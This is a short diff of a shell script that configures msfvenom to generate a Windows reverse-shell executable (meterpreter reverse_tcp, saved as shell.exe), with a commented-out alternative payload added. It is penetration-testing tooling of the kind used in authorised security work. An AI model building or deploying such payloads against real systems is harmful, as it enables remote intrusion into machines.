@@ -6,6 +6,7 @@ Create EXE file
 
 source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"
 
+# payload="windows/shell_reverse_tcp"
 payload="windows/x64/meterpreter/reverse_tcp"
 format="exe"
 filename="shell.exe"
